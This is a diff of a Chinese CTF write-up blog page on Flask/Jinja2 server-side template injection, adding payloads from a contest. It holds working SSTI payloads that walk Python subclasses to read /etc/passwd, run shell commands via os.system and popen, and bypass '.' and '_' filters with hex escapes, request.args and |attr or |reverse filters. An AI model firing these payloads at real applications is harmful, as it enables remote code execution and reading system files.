@@ -51,7 +51,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/02/24/jw7sStYhX534kTa.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/VhvMFANZCy7m9fz.png">
 <meta property="og:image" content="https://i.loli.net/2020/02/24/WAyTklhRX4iYeOa.png">
-<meta property="og:updated_time" content="2020-02-26T13:50:17.674Z">
+<meta property="og:updated_time" content="2020-02-26T15:08:10.544Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="flask模版注入">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/24/NB1qgLYkTtIsiWo.png">
@@ -346,12 +346,17 @@
 <p>jinja2的for循环一把梭</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;/etc/passwd&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% for c in &apos;&apos;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;_wrap_close&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;system&apos;](&apos;ls&apos;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
-<p>================分割线</p>
-<p><strong>安恒杯元旦月赛</strong></p>
-<blockquote>
-<p>过滤<code>.</code>和<code>_</code></p>
-</blockquote>
+<p>======================分割线</p>
+<p><strong>安恒杯抗疫月赛</strong></p>
+<p>没打比赛，似乎是过滤了<code>.</code>和<code>_</code>，看到下面两个payload</p>
+<p>payload1，利用16进制编码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[30][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;\x5f\x5fbuiltins\x5f\x5f&quot;][&apos;\x5f\x5fimport\x5f\x5f&apos;](&apos;os&apos;)[&quot;popen&quot;](&apos;cat%20/flag*&apos;)[&apos;read&apos;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2，利用request</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request[&apos;args&apos;][&apos;x1&apos;])|attr(request[&apos;args&apos;][&apos;x2&apos;])|attr(request[&apos;args&apos;][&apos;x3&apos;])()|attr(request[&apos;args&apos;][&apos;x4&apos;])(233)|attr(request[&apos;args&apos;][&apos;x5&apos;])|attr(request[&apos;args&apos;][&apos;x6&apos;])|attr(request[&apos;args&apos;][&apos;x4&apos;])(request[&apos;args&apos;][&apos;x7&apos;])|attr(request[&apos;args&apos;][&apos;x4&apos;])(request[&apos;args&apos;][&apos;x8&apos;])(request[&apos;args&apos;][&apos;x9&apos;])&#125;&#125;?x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&apos;想要执行的命令&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p>这里突然意识到文章前面都没有提到过滤器，而在模版引擎中过滤器也有很多szs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#比如flag被过滤，|reverse</span><br><span class="line">&apos;&apos;.__class__.__mro__[-1].__subclasses__()[40](&apos;galf&apos;|reverse).read()</span><br><span class="line">#比如getattr被过滤，|attr</span><br><span class="line">(&apos;&apos;|attr(&apos;__class__&apos;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">#names|last，取序列最后一个元素等等</span><br></pre></td></tr></table></figure>
 
 <h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p> <a href="http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/" target="_blank" rel="noopener">http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/</a> </p>
 <p> <a href="https://lihuaiqiu.github.io/2019/07/07/SSTI模板注入-Jinja2/#more" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more</a> </p>
